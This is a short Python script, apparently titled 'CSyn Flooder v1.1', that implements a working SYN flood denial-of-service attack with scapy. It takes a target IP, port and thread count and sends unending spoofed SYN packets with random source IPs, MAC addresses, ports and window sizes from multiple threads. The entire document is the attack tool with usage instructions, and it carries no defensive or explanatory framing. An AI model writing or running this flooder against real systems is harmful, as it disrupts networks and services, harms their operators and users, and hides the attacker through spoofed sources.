#!/usr/bin/python3
# Tokuchi Toua
# csyn_flooder.py (Python3 SYN Flooder)

import random
import sys
import threading
from scapy.all import *
from scapy.layers.inet import TCP, IP, Ether

print("""

#############################
##### CSyn Flooder v1.1 #####
#############################
1.Default Settings
\ta.Random Source IP Address
\tb.Random Source Port Number
\tc.Random Source Mac Address
\td.Random Window Size
\te.Multi Threading
If you want to exit press  Ctrl+C
If you don't want to see verbose, change the verbose value with False
""")

if len(sys.argv) != 4:
    print("usage: python3 csyn_flooder.py <TargetIP> <TargetPort> <Thread>\n")
    sys.exit()

targe = str(sys.argv[1])
dport = int(sys.argv[2])
threads = int(sys.argv[3])




def syndos(targe, dport):
    while True:
        s_addr = RandIP()
        s_mac = RandMAC()
        eth = Ether(src=s_mac)
        windowss = random.randint(1025, 64502)
        s_port = RandShort()
        size = random.randint(1, 100)
        ip = IP(src=s_addr, dst=targe)
        tcp = TCP(sport=s_port, dport=dport, flags='S', window=windowss)
        payload = Raw(RandString(size=size))
        sendp(eth / ip / tcp / payload, inter=0.0001, verbose=True, count=10)  # default count 5 inter 0.0001


print("CSyn Flooder is working!!! \n"
      f"Target: {targe}:{dport}\n"
      "...")
for i in range(0, threads):
    threading.Thread(target=syndos, args=(targe, dport,)).start()


